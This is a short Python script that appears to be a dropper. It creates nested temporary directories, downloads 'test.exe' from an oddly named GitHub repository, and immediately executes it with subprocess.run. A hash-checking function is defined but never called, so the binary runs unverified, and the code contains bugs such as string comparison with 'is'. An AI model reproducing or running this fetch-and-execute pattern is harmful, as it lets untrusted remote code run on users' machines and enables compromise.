import os
import hashlib
import csv
import requests
import subprocess



def setup():
    try:
        global rootDir
        if os.name is 'nt':
            tmp = "C:"
            for i in range(0,10):
                tmp += "\\tmp"
                try:
                    os.mkdir(tmp)
                except FileExistsError:
                    continue
            rootDir = tmp
            return tmp
        else:
            tmp = "/tmp"
            for i in range(0,10):
                tmp += "/tmp"
                try:
                    os.mkdir(tmp)
                except FileExistsError:
                    continue
            rootDir = tmp
            return tmp
    except:
        return tmp

def mkDir(dir):
    tmp = setup()
    try:
        if os.name is 'nt':
            dir = dir.split("/")
            for i in dir[:-1]:
                tmp += i + "\\"
                try:
                    os.mkdir(tmp)
                except FileExistsError:
                    continue
            return tmp
        else:
            dir = dir.split("/")
            for i in dir[:-1]:
                tmp += i + "/"
                try:
                    os.mkdir(tmp)
                except FileExistsError:
                    continue
            return tmp
    except:
        return False



def download(url):
    if setup():
        try:
            tmp = url.split("/master")[-1]
            tmp = mkDir(tmp)
            tmp += url.split("/master")[-1].split("/")[-1]
            with open(tmp,"wb") as f:
                f.write(requests.get(url).content)
                f.close()
            return tmp
        except:
            return tmp
    else:
        return tmp

def checkIntegrity(filename,url):
    sha256sumFile = download(url)
    try:
        with open(sha256sumFile, 'r') as file:
            reader = csv.reader(file)
            sha256sumDict = {rows[0]: rows[1] for rows in reader}
        os.remove(sha256sumFile)
        with open(filename,'rb') as file:
            bytes = file.read()
        sha256sum = hashlib.sha256(bytes).hexdigest()
        if(sha256sumDict.get(filename) == sha256sum):
            return  True
        else:
            return False

    except:
        return False


exe = download("https://github.com/E1i0t/qwertyuiopasdfghjklzxcvbnm/raw/master/test.exe")
print(exe)
subprocess.run([exe],shell=False)